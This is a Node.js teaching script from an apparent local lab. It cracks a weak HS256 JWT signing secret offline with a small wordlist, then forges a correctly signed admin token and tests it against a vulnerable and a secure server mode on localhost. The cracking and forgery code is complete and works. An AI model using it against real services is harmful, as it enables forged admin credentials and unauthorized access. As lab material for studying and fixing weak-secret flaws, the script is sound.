'use strict';

/**
 * ATTACK 2 — offline brute force of a weak HMAC secret (local lab tool).
 *
 * An HS256 token's signature is HMAC-SHA256 over `header.payload` keyed with
 * the server's secret. If that secret is a short, guessable word, an attacker
 * who has captured ONE valid token can try candidate secrets offline — no
 * requests to the server, no rate limit to trip — until a candidate reproduces
 * the token's signature. Once the secret is known, the attacker can mint a
 * perfectly valid token with ANY claims, including role=admin.
 *
 * Usage:
 *   node attacker/brute-secret.js [<captured-token>]
 * If no token is supplied, the script fabricates a sample user token signed
 * with the lab's weak secret to stand in for one sniffed from a cookie.
 */
const jwt = require('../src/jwt');

// A tiny wordlist standing in for a real cracking dictionary (rockyou, etc.).
const WORDLIST = [
  '123456', 'password', 'admin', 'letmein', 'qwerty', 'changeme',
  'secretkey', 'jwt', 'token', 'supersecret', 'secret', 'key', 'password123',
];

// 1) Obtain a captured token to crack.
let captured = process.argv[2];
if (!captured) {
  captured = jwt.sign(
    { sub: 'alice', role: 'user' },
    'secret', // the lab's weak secret — pretend this was sniffed, not known
    { ttlSeconds: 900, issuer: 'drukpass.local', audience: 'drukpass.webapp' }
  );
  console.log('No token supplied; using a fabricated captured user token:\n' + captured + '\n');
}

const parts = captured.split('.');
if (parts.length !== 3) {
  console.error('That does not look like a signed JWT (need header.payload.signature).');
  process.exit(1);
}
const signingInput = `${parts[0]}.${parts[1]}`;
const targetSig = parts[2];

console.log('=== Attack 2: weak-secret brute force ===\n');
console.log(`Trying ${WORDLIST.length} candidate secrets against the captured signature...\n`);

// 2) Try each candidate until its HMAC reproduces the captured signature.
let found = null;
for (const candidate of WORDLIST) {
  const sig = jwt.hmacSign(signingInput, candidate);
  const hit = sig === targetSig;
  console.log(`  ${hit ? '[FOUND]' : '  ...  '} "${candidate}"`);
  if (hit) { found = candidate; break; }
}

if (!found) {
  console.log('\nNo candidate matched. (A stronger secret defeats this attack entirely.)');
  process.exit(0);
}

console.log(`\nCracked secret: "${found}"\n`);

// 3) Forge a fully valid admin token with the cracked secret.
const forged = jwt.sign(
  { sub: 'attacker', role: 'admin' },
  found,
  { ttlSeconds: 900, issuer: 'drukpass.local', audience: 'drukpass.webapp' }
);

console.log('Forged admin token (correctly signed with the cracked secret):');
console.log(forged + '\n');
console.log('Paste it into http://localhost:4000/inspect.');
console.log('  - VULNERABLE mode: ACCEPTED (same weak secret), role=admin.');
console.log('  - SECURE mode: the server uses a 32-byte random secret, so this');
console.log('    signature no longer matches and the token is REJECTED.');
